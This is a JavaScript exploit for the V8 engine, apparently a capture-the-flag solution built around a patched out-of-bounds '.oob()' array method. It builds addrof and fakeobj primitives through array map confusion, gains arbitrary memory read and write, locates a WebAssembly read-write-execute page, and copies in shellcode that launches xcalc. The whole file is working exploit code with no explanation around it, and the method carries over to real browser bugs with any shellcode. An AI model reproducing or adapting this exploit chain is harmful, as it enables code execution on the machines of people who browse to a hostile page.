var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64buf = new Uint32Array(buf);

function ftoi(val){
	f64_buf[0] = val;
	return BigInt(u64buf[0]) + (BigInt(u64buf[1]) << 32n);
}

function itof(val){
	u64buf[0] = Number(val & 0xffffffffn);
	u64buf[1] = Number(val >> 32n);
	return f64_buf[0];
}

/// Construct addrof primitive
var temp_obj = {"A":1};
var obj_arr = [temp_obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var craf = [1.1, 1.2, 1.3, 1.4]
var map1 = obj_arr.oob();
var map2 = float_arr.oob();

function addrof(obj){
	// Set the object address to leak
	obj_arr[0] = obj;

	// Set the obj array map to float array map
	obj_arr.oob(map2);

	let addr = obj_arr[0];

	// make things normal again
	obj_arr.oob(map1);
	return ftoi(addr);
}

function fakeobj(addr){
	// keep the address in the first index
	float_arr[0] = itof(addr);

	// Change the float type to obj type
	float_arr.oob(map1);

	// Get a fake object at that memory
	let fake = float_arr[0];

	// back to normal
	float_arr.oob(map2);
	return fake;
}

var fake = [1.1]
function arb_read(toleak){
	
	craf[0] = craf.oob(); 	// map
	craf[1] = 0;		 	// properties
	craf[2] = itof(BigInt(toleak) - 0x10n); // elements
	
	fake = fakeobj(addrof(craf) - 0x20n );

	return ftoi(fake[0]);
}

function initial_write(addr, val){
	
	craf[0] = craf.oob(); 	// map
	craf[1] = 0;		 	// properties
	craf[2] = itof(BigInt(addr) - 0x10n); // elements
	
	fake = fakeobj(addrof(craf) - 0x20n );

	fake[0] = itof(BigInt(val));
}

var buf = new ArrayBuffer(8);
var dat = new DataView(buf);
function arb_write(addr, val){
	initial_write((addrof(buf) + 0x20n), addr);
	dat.setBigInt64(0, BigInt(val), true); // little endian
}

function copy_code(addr, shellcode){
	let buf = new ArrayBuffer(0x100);
	let dat = new DataView(buf);

	let bstore = addrof(buf) + 0x20n;
	initial_write(bstore, addr);

	for(let i=0;i<shellcode.length;i++){
		dat.setUint32(4*i, shellcode[i], true);
	}
}

/* Main Exploit - we assembly */

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var rwx_page_addr = arb_read(addrof(wasm_instance)+0x88n);

var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

console.log("[+] Copying xcalc shellcode to RWX page");
copy_code(rwx_page_addr, shellcode);
console.log("[+] Popping calc");
f();
